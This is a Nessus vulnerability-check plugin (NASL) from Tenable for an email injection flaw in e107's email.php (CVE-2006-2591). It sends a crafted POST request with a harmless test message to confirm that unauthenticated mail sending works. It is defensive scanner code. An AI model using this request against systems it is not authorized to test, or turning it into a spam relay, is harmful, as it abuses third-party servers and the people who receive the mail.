#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21621);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-2591");
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"25740");


  script_name(english:"e107 Email Injection Vulnerability");
  script_summary(english:"Tries to send arbitrary email with e107");

  desc = "
Synopsis :

The remote web server contains a PHP script that can be used to send
arbitrary e-mail messages. 

Description :

The version of e107 installed on the remote host contains a script,
'email.php', that allows an unauthenticated user to send e-mail
messages to arbitrary users and to control to a large degree the
content of those messages.  This issue can be exploited to send spam
or other types of abuse through the affected system. 

See also :

http://e107.org/e107_plugins/forum/forum_viewtopic.php?66179
http://e107.org/comment.php?comment.news.788

Solution :

Either remove the affected script or upgrade to e107 version 0.7.5 or
later, which uses a 'captcha' system to minimize automated
exploitation of this issue. 

Risk factor :

Medium / CVSS Base Score : 5.5
(AV:R/AC:H/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("e107_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/e107"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  url = string(dir, "/email.php?", SCRIPT_NAME);

  # Make sure the affected script exists.
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("name='emailsubmit'" >< res)
  {
    # Try to send a message.
    note = string("Test message sent by Nessus / ", SCRIPT_NAME, ".");
    postdata = string(
      "comment=", urlencode(str:note), "&",
      "author_name=nessus&",
      "email_send=nobody@123.zzzz&",
      "emailsubmit=Send+Email"
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if the message was sent.
    if (">Email sent<" >< res)
      security_warning(port);
  }
}
